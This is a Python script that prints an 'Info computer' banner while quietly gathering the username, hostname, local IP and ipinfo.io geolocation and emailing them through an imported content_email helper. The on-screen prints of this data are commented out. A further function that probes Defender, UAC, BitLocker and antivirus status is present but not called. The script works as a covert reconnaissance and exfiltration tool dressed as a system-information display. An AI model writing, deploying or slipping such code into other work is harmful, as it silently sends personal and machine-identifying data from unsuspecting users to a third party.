import getpass
import socket
import subprocess
import requests
import wmi

from send_email import content_email

def userName():
    username = getpass.getuser()
    #print(f"\033[96mUsername: {username}\033[0m")
    return username

def ip_address():
    hostname = socket.gethostname()
    # Get the IP address using the hostname
    ip_address = socket.gethostbyname(hostname)
    #print(f"\033[92mIP Address: {ip_address}\033[0m")
    info = f"host name: {hostname} ,IP Address: {ip_address}"
    return info

def check_security():
    print("\033[95mSecurity Information:\033[0m")
    
    # Check Windows Defender status
    try:
        # Explicitly invoke PowerShell and pass the command as a single string
        defender_status = subprocess.check_output(["powershell", "-Command", "Get-MpPreference | Select -ExpandProperty DisableRealtimeMonitoring"])
        if defender_status.strip() == b'False':
            print("\033[92mWindows Defender is active.\033[0m")
        else:
            print("\033[91mWindows Defender is disabled.\033[0m")
    except Exception as e:
        print("\033[91mCould not determine Windows Defender status.\033[0m")
        print(f"Error: {e}")
        # Check for Windows Updates status
    try:
        updates_status = subprocess.check_output(["powershell", "-Command", "Get-WindowsUpdateLog -WarningAction SilentlyContinue | Select-String -Pattern 'Installation Successful' -NotMatch | Select-Object -First 1"])
        if updates_status:
            print("\033[92mPending Windows Updates found.\033[0m")  # Light green for "found"
        else:
            print("\033[92mWindows is up-to-date.\033[0m")  # Light green for "up-to-date"
    except Exception as e:
        print("\033[91mCould not determine Windows Updates status.\033[0m")  # Red for error

    # Check UAC status
    try:
        uac_status = subprocess.check_output(["powershell", "-Command", "(Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).EnableLUA"])
        if uac_status.strip() == b'1':
            print("\033[92mUser Account Control (UAC) is enabled.\033[0m")  # Light green for "enabled"
        else:
            print("\033[91mUser Account Control (UAC) is disabled.\033[0m")  # Red for "disabled"
    except Exception as e:
        print("\033[91mCould not determine UAC status.\033[0m")  # Red for error

    # Check BitLocker status
    try:
        bitlocker_status = subprocess.check_output(["powershell", "-Command", "Get-BitLockerVolume | Where-Object {$_.MountPoint -eq 'C:'} | Select-Object -ExpandProperty ProtectionStatus"])
        if bitlocker_status.strip() == b'1':
            print("\033[92mBitLocker is enabled on the system drive.\033[0m")
        else:
            print("\033[91mBitLocker is disabled on the system drive.\033[0m")
    except Exception as e:
        print("\033[91mCould not determine BitLocker status.\033[0m")

    # Check Windows Security Center status
    try:
        security_center_status = subprocess.check_output(["powershell", "-Command", "Get-MpComputerStatus | Select-Object -ExpandProperty AntivirusEnabled"])
        if security_center_status.strip() == b'True':
            print("\033[92mWindows Security Center reports antivirus is active.\033[0m")
        else:
            print("\033[91mWindows Security Center reports antivirus is not active.\033[0m")
    except Exception as e:
        print("\033[91mCould not determine Windows Security Center status.\033[0m")

def get_ip_location():
    try:
        # Send a request to the ipinfo.io API for the current IP's geolocation data
        response = requests.get('https://ipinfo.io/json')
        response.raise_for_status()  # Raises an HTTPError if the HTTP request returned an unsuccessful status code
        
        # Parse the JSON response
        data = response.json()
        
        # Extract and print the location information
        location = data.get('loc', 'Location information not available')
        city = data.get('city', 'City information not available')
        region = data.get('region', 'Region information not available')
        country = data.get('country', 'Country information not available')
        
        stringLocation = f"{location}, {city}, {region}, {country}"
        #print(f"\033[93Location: \033[0m{location} (Lat,Lon)")
        #print(f"\033[93mCity: \033[0m{city}")
        #print(f"\033[93mRegion: \033[0m{region}")
        #print(f"\033[93mCountry: \033[0m{country}")
        return stringLocation
    except requests.RequestException as e:
        #print(f"Error fetching location information: {e}")
        return f"Error fetching location information: {e}"

def print_infos():
    # ASCII Art Title
    print(r"""
  _____        __                                         _                
  \_   \_ __  / _| ___     ___ ___  _ __ ___  _ __  _   _| |_ ___ _ __   _ 
   / /\/ '_ \| |_ / _ \   / __/ _ \| '_ ` _ \| '_ \| | | | __/ _ \ '__| (_)
/\/ /_ | | | |  _| (_) | | (_| (_) | | | | | | |_) | |_| | ||  __/ |     _ 
\____/ |_| |_|_|  \___/   \___\___/|_| |_| |_| .__/ \__,_|\__\___|_|    (_)
                                             |_|                           
    """)
    # Bottom border
    # Collecting information
    user_info = userName()
    ip_info = ip_address()
    # security_status = check_security()
    location_info = get_ip_location()

    # Formatting the email body
    email_body = f"{user_info}\n{ip_info}\n{location_info}"

    # Sending the email
    content_email(email_body)

print_infos()
